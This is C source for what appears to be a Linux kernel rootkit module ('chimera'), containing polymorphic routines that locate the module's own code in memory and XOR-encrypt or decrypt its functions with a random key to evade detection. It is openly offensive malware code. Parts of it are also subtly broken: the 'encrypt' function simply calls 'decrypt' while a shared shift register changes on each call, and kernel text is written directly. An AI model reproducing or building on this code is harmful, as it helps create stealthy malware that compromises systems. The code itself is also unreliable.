#include "chimera.h"

static void xor_shift_region(void *addr, size_t len,
                             const __u8 *key, __u32 *shift)
{
    __u8 *p = (__u8 *)addr;

    for (size_t i = 0; i < len; i++) {
        __u8 key_byte = key[i % AES_KEY_SIZE];
        __u8 shift_byte = (__u8)((*shift >> ((i % 32) & 0x1F)) & 0xFF);
        p[i] ^= key_byte ^ shift_byte;
    }

    *shift ^= *shift << 13;
    *shift ^= *shift >> 17;
    *shift ^= *shift << 5;
}

void rk_polymorph_mutate(struct poly_state *ps)
{
    struct module *mod = THIS_MODULE;
    unsigned long text_start, text_end, text_len;

    if (!mod->core_layout.base || mod->core_layout.size == 0)
        return;

    text_start = (unsigned long)mod->core_layout.text;
    text_end   = (unsigned long)mod->core_layout.text +
                 mod->core_layout.text_size;

    if (text_start == 0 || text_end <= text_start)
        text_start = (unsigned long)mod->core_layout.base;

    text_len = text_end - text_start;
    if (text_len == 0 || text_len > mod->core_layout.size)
        text_len = mod->core_layout.size;

    ps->text_start = text_start;
    ps->text_len   = text_len;
    ps->generation++;

    if (ps->generation == 1)
        get_random_bytes(ps->xor_key, AES_KEY_SIZE);
}

void rk_polymorph_decrypt_func(void *func_addr, size_t func_len)
{
    struct poly_state *ps = &g_state.poly;

    if (ps->text_start == 0)
        return;

    xor_shift_region(func_addr, func_len, ps->xor_key, &ps->shift_reg);
}

void rk_polymorph_encrypt_func(void *func_addr, size_t func_len)
{
    rk_polymorph_decrypt_func(func_addr, func_len);
}
